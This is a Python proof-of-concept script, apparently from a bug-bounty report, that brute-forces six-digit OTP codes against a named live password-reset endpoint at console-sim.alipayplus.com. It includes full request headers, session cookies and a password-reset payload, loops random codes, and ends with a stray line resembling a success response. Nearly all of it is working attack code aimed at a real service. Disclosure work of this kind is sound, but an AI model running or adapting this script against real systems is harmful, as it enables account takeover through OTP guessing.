"""
PoC: Missing Rate Limiting on OTP Verification Endpoint
Target: console-sim.alipayplus.com
Endpoint: POST /mgw.htm (gmp.openplatform.portal.reset.user.password)
Purpose: Demonstrate that the endpoint does not enforce rate limiting,
         lockout, or CAPTCHA after repeated failed OTP attempts.
"""

import requests
import time
import random
import sys

URL = "https://console-sim.alipayplus.com/mgw.htm"

HEADERS = {
    "Host": "console-sim.alipayplus.com",
    "X-Fe-Version": "1.1.0",
    "Appid": "SAAS_PORTAL",
    "Workspaceid": "GLOBAL_MINI_PROGRAM",
    "Cache-Control": "no-cache",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": '"Not(A:Brand";v="8", "Chromium";v="144"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Biztype": "PDS_STORE",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Locale": "en_US",
    "Operation-Type": "gmp.openplatform.portal.reset.user.password",
    "Origin": "https://console-sim.alipayplus.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://console-sim.alipayplus.com/forgotPassword",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i",
}

COOKIES = {
    "x-hng": "lang=en-US",
    "spanner": "QnZkslBvBzOljXdzbMIydECwpifDLBP04EJoL7C0n0A=",
}

# Known failure response to compare against
KNOWN_FAILURE = "CHECK_VERIFY_FAILED"

ATTEMPT_COUNT = 50


def build_payload(otp_code: str) -> list:
    return [{
        "loginId": "0xkujen-ywh-fdd598ecef7c9f7b@yeswehack.ninja",
        "verifyCode": otp_code,
        "loginType": "EMAIL",
        "requestId": "",
        "rdsInfo": {},
        "encryptedPassword": "GItHFkF1fEIfPPOL1pO5GrTDH+e/zVY7jdN7R4wVCgTCDxraPZlghEp46wRZ7W4EWccjxH5aACplUf6b5I2xu7RHP3R7hEULKLpVYEq5NAgRtJPTxCt9Pzqj5hph8KCI4bLtQ5Z9tsxddfXYboE1UDLG/MFI13Xgs+NO3uL9lqvSEhDdVWJaD0T4XkfAzmOUX58RZZqyq6DuWRNcwx8g5Owly2dHwIpIkxDoIP6nY/Hhnh09qy0FVWFq2qOyjCata6louC1Wo7ogRTdZYdAcTmYVYGwtDkvyVy5ARMeb6zFcqsQ1Irtai02ezT2khh7yshCC9WpQRlwZJvuIG3mPuQ==",
        "uuid": "eHUfCt1jhyJvbniNhHQW2plwIN1fnZv9",
        "salt": "4moYR9OP09pM",
        "currentWorkspace": "SAAS_PORTAL",
    }]


def main():
    print(f"[*] PoC: OTP Rate Limit Testing")
    print(f"[*] Target: {URL}")
    print(f"[*] Attempts: {ATTEMPT_COUNT}")
    print(f"[*] Looking for any response different from known failure")
    print("-" * 70)

    results = {"identical_failures": 0, "different_responses": 0, "errors": 0}

    for i in range(1, ATTEMPT_COUNT + 1):
        otp = f"{random.randint(0, 999999):06d}"
        payload = build_payload(otp)

        try:
            resp = requests.post(
                URL, json=payload, headers=HEADERS, cookies=COOKIES, timeout=15
            )
            status = resp.status_code
            body = resp.text

            if KNOWN_FAILURE in body:
                label = "SAME (no rate limit triggered)"
                results["identical_failures"] += 1
            else:
                label = "DIFFERENT <---"
                results["different_responses"] += 1

            print(f"[{i:03d}] OTP={otp} | HTTP {status} | {label}")

            if KNOWN_FAILURE not in body:
                print(f"      Response: {body[:300]}")

        except requests.RequestException as e:
            results["errors"] += 1
            print(f"[{i:03d}] OTP={otp} | ERROR: {e}")

        

    print("-" * 70)
    print("[*] Summary:")
    print(f"    Identical failure responses : {results['identical_failures']}")
    print(f"    Different responses          : {results['different_responses']}")
    print(f"    Errors                       : {results['errors']}")
    print()

    if results["identical_failures"] == ATTEMPT_COUNT:
        print("[!] FINDING: All attempts returned the same failure response.")
        print("    No rate limiting, lockout, or CAPTCHA was enforced.")
        print("    An attacker could brute-force the 6-digit OTP (10^6 attempts).")
    elif results["different_responses"] > 0:
        print("[*] Some responses differed from the known failure.")
        print("    Review the output above for details.")


if __name__ == "__main__":
    main()






"success":true,"verifySuccess":true,"isFinish":true